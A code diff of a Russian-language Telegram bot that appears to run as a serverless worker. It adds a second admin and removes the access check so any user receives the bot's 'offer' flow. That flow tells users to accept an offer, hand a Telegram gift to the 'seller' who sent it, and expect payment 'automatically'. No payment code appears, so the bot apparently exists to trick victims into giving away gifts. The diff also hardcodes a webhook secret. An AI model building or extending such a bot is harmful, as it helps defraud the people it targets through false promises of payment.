@@ -1,4 +1,5 @@
-const ADMIN_ID = 5151757168; // Твой ID
+const ADMIN_ID = 5151757168; // Твой основной ID
+const ADMIN_ID_2 = 8880934795; // Новый админ
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
 
 export default {
@@ -17,10 +18,10 @@ export default {
       const update = await request.json();
 
       // ==========================================
-      // ПРОВЕРКА ДОСТУПА (ТОЛЬКО ТЕ, КОГО ДОБАВИЛ АДМИН)
+      // ПРОВЕРКА ДОСТУПА
       // ==========================================
       async function checkAccess(userId, username) {
-          if (userId === ADMIN_ID) return true; 
+          if (userId === ADMIN_ID || userId === ADMIN_ID_2) return true; 
           if (!kv) return false; 
           
           const byId = await kv.get(`allowed_id:${userId}`);
@@ -34,12 +35,12 @@ export default {
       }
 
       // ==========================================
-      // КОМАНДЫ /add, /remove И /remove all (ТОЛЬКО ДЛЯ АДМИНА)
+      // КОМАНДЫ /add, /remove И /remove all (ТОЛЬКО ДЛЯ АДМИНОВ)
       // ==========================================
       if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
         const senderId = update.message.from.id;
         
-        if (senderId !== ADMIN_ID) {
+        if (senderId !== ADMIN_ID && senderId !== ADMIN_ID_2) {
             await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⛔ У вас нет прав на эту команду." }, BOT_TOKEN);
             return new Response("OK", { status: 200 });
         }
@@ -55,7 +56,6 @@ export default {
             return new Response("OK", { status: 200 });
         }
 
-        // --- /remove all ---
         if (command === "/remove" && targetUser.toLowerCase() === "all") {
             try {
                 let cursor = undefined;
@@ -66,7 +66,7 @@ export default {
                         const list = await kv.list({ cursor });
                         for (const key of list.keys) {
                             if (key.name.startsWith("allowed_")) {
-                                if (key.name === `allowed_id:${ADMIN_ID}`) continue;
+                                if (key.name === `allowed_id:${ADMIN_ID}` || key.name === `allowed_id:${ADMIN_ID_2}`) continue;
                                 keysToDelete.push(key.name);
                             }
                         }
@@ -106,13 +106,13 @@ export default {
       }
 
       // ==========================================
-      // КОМАНДА /stats (ТОЛЬКО ДОСТУП)
+      // КОМАНДА /stats
       // ==========================================
       if (update.message && update.message.text === "/stats") {
         const senderId = update.message.from.id;
         const chatId = update.message.chat.id;
 
-        if (senderId !== ADMIN_ID) {
+        if (senderId !== ADMIN_ID && senderId !== ADMIN_ID_2) {
             await callApi("sendMessage", { chat_id: chatId, text: "⛔ У вас нет прав." }, BOT_TOKEN);
             return new Response("OK", { status: 200 });
         }
@@ -169,15 +169,10 @@ export default {
 
         if (kv) await kv.put(`user:${userId}`, username);
 
-        const hasAccess = await checkAccess(userId, username);
-
-        if (!hasAccess) {
-            await callApi("sendMessage", { chat_id: chatId, text: `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к администратору.`, parse_mode: "HTML" }, BOT_TOKEN);
-        } else {
-            const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок.\n4. Оплата приходит автоматически.`;
-            const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
-            await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
-        }
+        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок продавцу.\n4. Оплата приходит автоматически.`;
+        
+        const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
+        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
       }
 
       // --- INLINE-ЗАПРОСЫ ---
@@ -214,7 +209,6 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
         
-        // ПОЛУЧАТЕЛЬ - ТОТ, КТО КИНУЛ ОФФЕР
         const targetReceiver = iq.from.username || "gwrex";
 
         let text = "";
@@ -264,7 +258,7 @@ export default {
         
         if (cq.data === "how_to_accept") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-          const instructionText = `🎁 <b>Инструкция:</b>\n\n1. Нажмите «Принять».\n2. Нажмите «Передать подарок».\n3. Отправьте подарок продавцу.\n4. Оплата придет автоматически.`;
+          const instructionText = `🎁 <b>Пошаговая инструкция:</b>\n\n1. Нажмите «Принять».\n2. Нажмите «Передать подарок».\n3. Отправьте подарок продавцу.\n4. Оплата придет автоматически.`;
           const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
           try { await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
         }
@@ -272,7 +266,7 @@ export default {
         if (cq.data === "back_to_start") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
           const userId = cq.from.id;
-          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок.\n4. Оплата приходит автоматически.`;
+          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок продавцу.\n4. Оплата приходит автоматически.`;
           const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
           try { await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN); } catch (e) {}
         }
